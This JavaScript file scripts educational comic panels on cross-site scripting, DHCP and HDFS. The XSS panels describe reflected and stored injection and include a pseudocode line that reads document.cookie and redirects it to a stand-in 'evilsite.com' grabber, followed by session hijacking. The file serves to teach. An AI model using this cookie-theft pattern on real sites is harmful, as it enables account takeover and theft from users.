
function crosssitescripting(define, panel, say, send, hide, show, move) {
define('a', ['images/computer-evil.jpg', 34, 34], 100, 20, 60)
define('v', ['images/computer2.jpg', 34, 33], 100, 20, 80)
define('w', 'webserver', 100, 80, 40)
define('c', 'cookie', 50, 25, 85, 'hidden');

panel("", "", {clear: true});
say('', 'CROSS\nSITE\nSCRIPTING\n(XSS)', 50, 50, {type: 'none'});

panel("A typical website");
hide('a');
say('w', 'I am webserver.\nI use cookies.', 40, 25, {type: 'none', angles: [0, 180]});
say('v', 'I use that website', 
	30, 50, {type: 'none'});
say('', 'What are cookies?\nSee below\nV', 70, 80, {type: 'rect', color: '#99CCFF'});

panel('The attacker');
hide('v');
hide('w')
say('a', 'I am THE attacker.\nI will steal that guy\'s\ndata from the webserver',
	50, 30, {type: 'none', angles: [-90, 30]});
say('a', 'Oh.. did I say I will use\nCROSS SITE SCRIPTING', 
	60, 80, {type: 'none', angles: [130, -30]});

panel("Detour: What are cookies?", "", {type: 'banner'});

panel('New User Session', "", {width: 260})
show('c');
hide('a');
send('v', 'w', 'Login page\nusername: itsme\npass: *****', 
	20, 35, {angles: [90, 180, 0]});
send('w', 'v', 'Welcome back, Itsme\nHere\'s the cookie\nKeep it safe!\nKeep is Secure!', 
	80, 80, {angles: [-90, 0, 180]});
move('c', 80, 45);

panel('', '', {width: 100});
hide('a'); hide('w');show('c');
say('v', 'I will store this\ncookie and send to\nwebserver with each\npage request', 
	50, 20);
say('', 'COOKIE\n=\nMy Identity!', 
	70, 70, {type: 'rect', color: '#fdd'});

panel("Subsequent Website access")
hide('a'); show('c');
send('v', 'w', '');
move('c', 45, 55);
say('c', 'Cookie sent each time', 30, 30);
say('w', 'Ah.. its you Mr. Itsme\nRecognized you\nby your cookie!', 
	70, 85, {angles: [90, -90]});


panel('Back to our story: First type of cross site scripting', '', {type: 'banner'});
panel("Preliminary work");
hide('v');
move('a', 20, 85);
move('w', 80, 55);
send('a', 'w', 'website.com/some.cgi?mydata...', 
	41, 39, {angles: [90, 180, -90]});
send('w', 'a', 'mydata...', 
	83, 89, {angles: [-90, 0, 180]});
say('', 'Find some webpage\nthat displays part of the URL.', 53, 22);

panel('To repeat..');
say('', 'This is important!', 70, 10, {type: 'cloud', color: '#cfc', curvy: 15});
hide('a'); hide('v');
move('a', 40, 30);
send('a', 'w', '');
send('w', 'v', '', 0, 0, {angles: [-90, 90], curvy: 50})
say('', 'website.com/...ABCDEF...', 35, 24, {type: 'rect'});
say('', 'URL in browser\naddress bar', 32, 41);
say('', 'Welcome to website!\nABCDEF ......', 30, 87, {type: 'rect'});
say('', 'Web page returned', 30, 71);
say('', 'Yes, it happens\nmore than you\nwould think!', 80, 86);


panel('Trick #1');
hide('v'); hide('w');
say('a', 'I create a URL and put some\njavascript *code* IN THE URL!\n(did I say I am smart!)',
		50, 30, {angles: [-90, 0]});
say('', 'website.com/some.cgi?k=CODE...', 50, 85, {type: 'rect', color: '#faa'});

panel('Trick #2');
hide('w');
say('a', 'Now I fool that guy\nto click this link.', 
	50, 30, {angles: [-90, 90]});
send('a', 'v', 'Email:\nHey buddy,\nclick this link...',
	75, 70, {angles: [0, 0, 180], curvy: 40})

panel('Trick #2 (Alternate)');
move('w', 80, 50);
send('a', 'w', 'Post the link on\nsome other website', 31, 29, {angles: [0, 90]});
send('w', 'v', 'Victim visits this site\nand sees the link', 70, 90, {angles: [180, 0, 90]});

panel()
hide('w'); hide('a');
say('v', 'I see this link before me\nwebsite.com/some.cgi?k=CODE...',
	45, 10, {angles: [190, 90]});
say('v', 'It appears to be of\nwebsite I trust', 55, 40, {angles: [180, 60]});
say('v', 'Should I click it?', 65, 60, {angles: [180, 20]});
say('v', 'Why not? Here it goes..', 65, 90, {angles: [180, -20]});

panel('The attack');
hide('a');
send('v', 'w', 'GET some.cgi?k=CODE...', 35, 25, {angles: [90, 180]});
send('w', 'v', 'Welcome to website!\n...\nCODE', 70, 87, {angles: [180, 0, 90]});

panel();
hide('a'); hide('w');
say('v', 'Welcome to website!\n...\nCODE', 
	70, 80, {type: 'rect', angles: [180, 0]});
say('v', 'This CODE will execute\non MY browser\nwithout MY knowledge :(',
	50, 30, {type: 'cloud', curvy: 20})

panel();
hide('a'); hide('v'); hide('w');
move('a', 31, 33);
say('', 'Welcome to website!\n...\nCODE', 
	32, 26, {type: 'rect', angles: [180, 0]});
say('a', 'What harm can\nthis code do?\nWait for it..', 77, 80, {angles: [180, 0]});

}

function crosssitescripting2(define, panel, say, send, hide, show, move) {
define('a', ['images/computer-evil.jpg', 34, 34], 100, 20, 60)
define('v', ['images/computer2.jpg', 34, 33], 100, 20, 80)
define('w', 'webserver', 100, 80, 40)
define('c', 'cookie', 50, 25, 85, 'hidden');

panel('Second type of cross site scripting', '', {type: 'banner'});
panel('Preliminary work');
hide('v');
move('a', 20, 80);
say('', 'Leave Comments:\n[------------]\n[------------]\n[------------]', 
	50, 40, {type: 'rect'});
say('', 'Lets find a webpage that\nasks for text from users', 
	60, 80, {angles: [180, 0]});

panel('comments are shown to all');
move('v', 90, 90);
send('a', 'w', 'Leave Comments:\nNice Website!',
	40, 30, {angles: [0, 180]});
send('w', 'v', 'User xxxx says:\nNice Website!', 50, 80, {angles: [-90, 90, 0]});

panel('The flaw');
move('v', 90, 90);
send('a', 'w', '**Anything** written\nhere ..',
	30, 30, {angles: [0, 180]});
send('w', 'v', '... gets displayed here', 40, 80, {angles: [-90, 90, 0]});

panel('The Trick');
hide('v');
move('a', 20, 80);
send('a', 'w', 'Leave Comments:\nNice website!\n<script>CODE..',
	70, 80, {angles: [0, 180, 90]});
say('a', '(I am so smart)\nI will write\njavascript code\nin the comments',
	30, 35);
	
panel();
hide('v');
say('w', 'I save this\npermanently with me:\nNice website!\n<script>CODE..',
	40, 20, {angles: [0, 100]});
say('a', 'And I wait...', 60, 80, {angles: [90, 0]});

panel('the poor victim');
hide('a');
say('v', 'So whats new\non the website?\nlets check', 30, 30);
send('w', 'v', 'User xxxx says:\nNice website!\n<script>CODE..',
	75, 80, {angles: [180, 0, 90]})

panel('', '', {width: 150});
hide('a'); hide('w');
say('v', '...\n<script>CODE\n...', 
	60, 80, {type: 'rect', angles: [180, 0], color: '#faa'});
say('v', 'This CODE will execute\non MY browser\nwithout MY knowledge :(',
	50, 30, {type: 'cloud', curvy: 20})

panel('', '', {width: 150});
hide('a'); hide('v'); hide('w');
move('a', 27, 31);
say('', '...\n<script>CODE\n...', 
	27, 27, {type: 'rect', angles: [180, 0], color: '#faa'});
say('a', 'What harm can\nthis code do?\nComing right up..', 74, 71, {angles: [90, 0]});


panel('', '', {clear: true, width: 50});
say('', 'Damage:\n \nSteal\nCookie', 50, 40);

panel();
hide('v'); hide('w');
say('a', 'If I can steal his cookie\nI can pretend to be him', 60, 20, {angles: [-90, 90]});
say('a', 'I write my code thusly:\ncookie = document.cookie\nredirect(evilsite.com/\ngrab.cgi?c=cookie)', 
	59, 83, {angles: [90, 0]});

panel();
hide('w');show('c');
move('a', 20, 30);
move('c', 55, 50);
send('v', 'a', 'grab.cgi?c=MY COOKIE', 64, 84, {angles: [0, 0, 90], curvy: 40})
say('a', 'AHA.. now I have his cookie!', 61, 9, {angles: [-90, 0]});

panel();
hide('v'); show('c'); move('c', 50, 40);
say('a', 'Mischief time!', 33, 16, {type: 'ellipse'});
send('a', 'w', 'I am Itsme\nbecause I have the cookie.\nGimme all the private data', 
	61, 80, {angles: [0, 180, 90]});

panel();
hide('v');
move('a', 20, 50);
send('w', 'a', 'Of course, Mr. Itsme.\nYour cookie matches are records.\nHere\'s the data you wished for',
	54, 84, {angles: [180, 0, 90]});

panel();
hide('v'); show('c'); move('c', 50, 40);
send('a', 'w', 'While you are at it\nplease transfer $$ to me\nerr.. I mean my friend', 
	37, 16, {angles: [0, 180, -90]});
say('w', 'Wilco', 70, 80, {angles: [90, -90], type: 'ellipse'});

}

function dhcpbasics(define, panel, say, send, hide, show, move) {
//define("A", "host", 50, 20, 20);
define('A', ['images/computer2.jpg', 34, 33], 100, 20, 30);
define('B', ['images/computer2.jpg', 34, 33], 100, 10, 45);
define('C', ['images/computer2.jpg', 34, 33], 100, 20, 70);
define("S", "server", 50, 80, 50);

panel('', '', {clear: true, width: 140});
say('', 'Dynamic\nHost\nConfiguration\nProtocol\n(DHCP)', 50, 50);

panel('', '', {width: 200});
//move("C", 10, 50);
say(["A", "B", "C"], "We are hosts", 
	60, 20, 
	{type: 'cloud', angles: [[180, 0], [225, 0], [270, 0]]});
say("C", "I dont have IP address!", 40, 90, {angles: [90, -90]});
say("", "DHCP Server", 80, 70, {type: 'rect'});

panel("dhcp discover", '', {width: 200});
//send("C", "A", "", 20, 20, {angles: [0, 0]});
//send("C", "B", "", 20, 20, {angles: [0, 0]});
send("C", "S", "DHCP_Discover", 70, 90, {angles: [0, 180, 90]});
send("C", "A", "DHCP_Discover", 70, 90, {angles: [0, 0, 90]});
send("C", "B", "DHCP_Discover", 70, 90, {angles: [0, 0, 90]});
say("", "Broadcast\nin the subnet", 60, 25);

panel();
hide('C');
hide('S');
send("A", null, "", 40, 30);
send("B", null, "", 30, 60);
say('', "All other hosts\nwill ignore the\ndiscovery packet", 
62, 70, {type: 'cloud', curvy: 20});

panel();
hide('A'); hide('B'); hide('C');
move('S', 80, 70);
say('S', 'Address Table\n192.168.0.1 (used)\n192.168.0.2 (used)\n192.168.0.3 (free)\n192.168.0.4 (free)\n...',
	30, 50, {type: 'rect', angles: [0, 180]});
say('S', 'I need to find\none free address', 75, 20);

panel("DHCP OFFER");
hide('A'); hide('B');
move('S', 80, 70);
say('', 'Address Table\n192.168.0.3 (offered)',
	70, 20, {type: 'rect'});
say('S', 'I will mark\nthe address as "offered"', 65, 45, {type: 'none'});
send('S', "C", "DHCP_Offer 192.168.0.3", 49, 91, {angles: [180, 0, 90]});

panel("dhcp request", '', {width: 200});
send("C", "A", "", 20, 20, {angles: [0, 0]});
send("C", "B", "", 20, 20, {angles: [0, 0]});
send("C", "S", "DHCP_Request 192.168.0.3", 70, 90, {angles: [0, 180, 90]});
send("A", null);
send("B", null);
say('', 'Also\nbroadcast!', 70, 25, {type: 'none'});

panel('', '', {width: 170});
hide('A'); hide('B'); hide('C');
move('S', 80, 70);
say('', 'Address Table\n192.168.0.1 (used)\n192.168.0.2 (used)\n192.168.0.3 (USED)\n192.168.0.4 (free)\n...',
	30, 50, {type: 'rect'});
say('S', 'One more\naddress gone!', 75, 20);

panel("DHCP Ack", '', {width: 170});
hide('A'); hide('B');
move('S', 80, 70);
say('S', 'One more happy client!\nI will now start a "lease" timer\nbut more on that some other time', 55, 35, {type: 'none'});
send('S', "C", "DHCP_Ack 192.168.0.3", 49, 91, {angles: [180, 0, 90]});

/*
panel("ARP")
hide('S');
send("C", "A", "", 20, 20, {angles: [0, 0]});
send("C", "B", "Anybody has 192.168.0.3?", 80, 70, {angles: [0, 0, 90]});
send("A", null);
send("B", null);
say('', "Client verifies no\nother host has\nsame IP address\nby using ARP", 
	70, 40, {type: 'none'});
*/	
panel("Two DHCP Servers. Client must select one of them", "", {type: "banner"});
define('T', 'server', 50, 80, 20);

panel("DHCP Discover");
hide('A', {permanent: true}); hide('B', {permanent: true});
send("C", "T", "", 20, 20, {angles: [0, 180]});
send("C", "S", "DHCP_Discover", 70, 85, {angles: [0, 180, 90]});
say('', 'Reaches both\nservers', 30, 40, {type: 'none'});

panel();
hide('C');
say('T', 'Address Table:\n192.168.0.123 (offered)', 
	35, 20, {type: 'rect', angles: [0, 180]});
say('S', 'Address Table:\n192.168.0.3 (offered)', 
	35, 50, {type: 'rect', angles: [0, 180]});
say('', 'Both servers have selected\none IP address', 60, 80, {type: 'none'});
	
panel('DHCP offer');
send('T', "C", "DHCP_Offer\n192.168.0.123", 25, 30, {angles: [180, 0, -90]});
send('S', "C", "DHCP_Offer\n192.168.0.3", 75, 85, {angles: [180, 0, 90]});

panel("Client selects one address");
send("C", "T", "", 20, 20, {angles: [0, 180]});
send("C", "S", "DHCP_Request 192.168.0.3", 60, 90, {angles: [0, 180, 90]});
send("C", "T", "DHCP_Request 192.168.0.3", 60, 90, {angles: [0, 180, 90]});
say('C', 'I select\n192.168.0.3', 20, 35);

panel()
say('T', 'Address Table:\n192.168.0.123 (FREE)', 
	35, 20, {type: 'rect', angles: [0, 180]});
say('S', 'Address Table:\n192.168.0.3 (USED)', 
	35, 50, {type: 'rect', angles: [0, 180]});
send('S', "C", "DHCP_Ack 192.168.0.3", 70, 90, {angles: [180, 0, 90]});

}

function hdfs(define, panel, say, send, hide, show, move) {
	define('c', ['images/computer2.jpg', 34, 33], 100, 20, 50);
	define('n', ['images/blade.png', 45, 20], 100, 60, 40);
	define('d1', ['images/blade.png', 45, 20], 100, 40, 90);
	define('d2', ['images/blade.png', 45, 20], 100, 60, 80);
	define('d3', ['images/blade.png', 45, 20], 100, 80, 90)
	define('u', ['images/BluePerson.gif', 30, 30], 100, 20, 70, 'hidden');
	
	panel("", "", {clear: true});
	say('', 'Hadoop\nDistributed\nFile\nSystem\n(HDFS)', 50, 50, {type: 'none'});
	
	panel("", "", {width: 220});
	say('n', "I am NAMENODE.\nI coordiate everything.", 71, 13);
	say('c', "I am CLIENT.\nI read/write data", 23, 21);
	say(['d1', 'd2', 'd3'], "We are DATANODES.\nWe store data", 
		60, 60, {angles: [[220, 90], [270, 90], [300, 90]]});
	
	panel("", "", {width: 200});
	move('c', 10, 80, {permanent: true});
	say('n', "There is only\nONE of me", 64, 13);
	say('c', "People sit in\nfront of me\n(there can be any\nnumber of me)", 22, 30);
	say(['d1', 'd2', 'd3'], "There are MANY of us.\nSometimes even thousands!", 60, 60);
	
	panel("Writing Data in HDFS Cluster", "", {type: 'banner'});
	
	panel("Request from User");
	hide('d1'); hide('d2'); hide('d3'); hide('n');
	show('u'); move('c', 70, 88);
	say('u', 'Please write 200 MB\ndata for me', 35, 30, {type: 'cloud'});
	say('c', 'Okay. I will see what\nI can do for you.\nBut--', 71, 55, {type: 'cloud'});
	
	panel("Blocks and replication");
	hide('d1'); hide('d2'); hide('d3'); hide('n');
	show('u'); move('c', 20, 78); 	move('u', 70, 88);
	say('c', '--are you not\nforgetting\nsomething?', 22, 35, {type: 'cloud'});
	say('u', 'Ah yes.. please:\na) divide the data\nin 128MB blocks\nb) copy each block\nin three places', 73, 45, {type: 'cloud'});
	
	panel("")
	hide('d1'); hide('d2'); hide('d3'); hide('n');
	say('c', 'A good client always knows\nthese two things', 56, 18, {type: 'cloud'});
	say('', 'BLOCKSIZE: large file is divided\nin blocks of 64MB or 128MB', 
		54, 48, {type: 'rect', color: '#fc9'});
	say('', 'REPLICATION FACTOR:\nnumber of places each\nblock must be replicated\n(usually 3)',
		64, 81, {type: 'rect', color: '#fc9'});
	
	panel('Divide file into blocks');
	hide('d1'); hide('d2'); hide('d3'); hide('n');
	move('n', 32, 40);
	say('', 'xxxxxxxxxxx\nxxxxxxxxxxx\nxxxxxxxxxxx\nxxxxxxxxxxx', 
		25, 40, {type: 'rect', color: '#fcc'});
	say('n', 'xxxxxxxxxxx\nxxxxxxxxxxx\nxxxxxx', 
		79, 45, {type: 'rect', angles: [180, 0], color: '#fcc'});
	say('n', 'xxxxxxxxxxx\nxxxx', 
		79, 80, {type: 'rect', angles: [180, 0], color: '#fcc'});
	
	panel("Ask Namenode");
	hide('d1'); hide('d2'); hide('d3');
	move('n', 80, 30, {permanent: true});
	say('c', 'I will work on\nthe first block\nfirst', 25, 40, {type: 'cloud'});
	send('c', 'n', 'Please help me write\n128MB block with\nreplication 3', 
		71, 79, {angles: [0, 180, 90]});
	
	panel();
	hide('d1'); hide('d2'); hide('d3');
	say('n', 'Need to find 3 datanodes\nfor this guy', 
		37, 13, {type: 'cloud', angles: [0, 90]});
	say('n', 'How do I do that?\nWill tell you some\nother time', 
		37, 44, {type: 'cloud', angles: [0, 240]});
	send('n', 'c', 'Here are the addresses\n of three datanodes', 
		70, 88, {angles: [-90, 0, 90]});
	
	panel();
	hide('n');
	move('d2', 60, 70, {permanent: true});
	say('c', 'I send my data to\nfirst datanode only', 
		50, 18, {type: 'cloud', angles: [180, 90]});
	send('c', 'd1', '', 0, 0, {angles: [90, 90], curvy: 40});
	
	panel();
	hide('n');
	say('d1', 'While I am recieving\ndata, I forward the same\ndata to the next datanote', 
		50, 18, {type: 'cloud'});
	send('c', 'd1', '', 0, 0, {angles: [90, 120], curvy: 40});
	send('d1', 'd2', '', 0, 0, {angles: [90, 120], curvy: 40});
	
	panel();
	hide('n');
	say('d2', 'I do the same\nwhat previous guy did', 
		50, 18, {type: 'cloud'});
	send('c', 'd1', '', 0, 0, {angles: [90, 120], curvy: 40});
	send('d1', 'd2', '', 0, 0, {angles: [90, 120], curvy: 40});
	send('d2', 'd3', '', 0, 0, {angles: [90, 90], curvy: 40});
	
	panel('TADA.. Replication pipeline');
	hide('n');
//	say('d2', 'I do the same\nwhat previous guy did', 
//		50, 18, {type: 'cloud'});
	send('c', 'd1', '', 0, 0, {angles: [90, 120], curvy: 40});
	send('d1', 'd2', '', 0, 0, {angles: [90, 120], curvy: 40});
	send('d2', 'd3', '', 0, 0, {angles: [90, 90], curvy: 40});

	panel();
	hide('c');
	say('', 'Once all data (for this block)\nis written to hard disk', 45, 13)
	send('d1', 'n', 'Done', 28, 43, {angles: [90, 180, 0]});
	send('d2', 'n', 'Me too', 24, 69, {angles: [90, 225, 0]});
	send('d3', 'n', 'Me too', 90, 74, {angles: [90, -90, 90]});
	
	panel();
	hide('d1'); hide('d2'); hide('d3');
	move('n', 80, 20);
	say('n', 'Block successfully stored\nand replicated in HDFS', 
		45, 49, {type: 'cloud', angles: [90, 180]});
	say('c', 'And I repeat the same\nsteps with remaining blocks', 
		59, 83, {type: 'cloud', angles: [180, 0]});
	/*
	= d1/d2/d3 to nn: we are done [when all data is written]
		nn: ok.. this block is successfully replicated
	
	
	
	*/
}